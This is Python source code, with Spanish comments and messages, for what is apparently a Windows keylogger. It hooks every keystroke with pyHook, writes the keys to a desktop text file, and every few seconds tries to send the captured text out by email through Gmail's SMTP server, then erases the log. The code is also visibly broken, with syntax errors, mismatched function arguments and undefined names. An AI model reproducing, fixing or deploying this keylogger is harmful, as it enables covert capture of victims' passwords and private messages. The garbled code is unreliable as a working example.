import pyHook, pythoncom, sys, logging, time, datetime

carpeta_destino= 'C:\Users\miniv\Desktop\Keylogger\Keylogger.txt'
segundos_espera= 7
timeout= time.time()= segundos_espera

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False
    
def EnviarEmail():
    with open (carpeta_destino, 'r+') as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data=f.readdata= data.replace('Space', ' ')
        data = data.replace('\n', '')
        data = 'Mensaje capturado a las: '+ fecha + '\n' + data
        print (data)
        crearEmail('', '', '')
        f.seek(0)
        f.truncate()


def crearEmail(user, passw, recp,subj, body):
    import smtplib
    mailUser=user
    mailPass=passw
    From = user
    To = recep
    Subject= subj
    Txt=body
    
    email = """\From: %S/nTo: %S\nSubject: %S\n\n%s """ % (From, ", ".join(To), Subject, Txt)

    try:
        server=smtplib-SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.startlist()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()
        print('Correo enviado con éxito!!')

    except:
        print('Correo fallido :(')

def OnKeyboardEvent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(messages)')
    print('WindowsName:', event.WindowName)
    print('Window:', event.Window)
    print('Key:', event.Key)
    logging.log(10, event.Key)
    return True
    
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown= OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut():
        EnviarEmail()
        timeout= time.time()+ segundos_espera

    pythoncom.PumpWaitingMessages()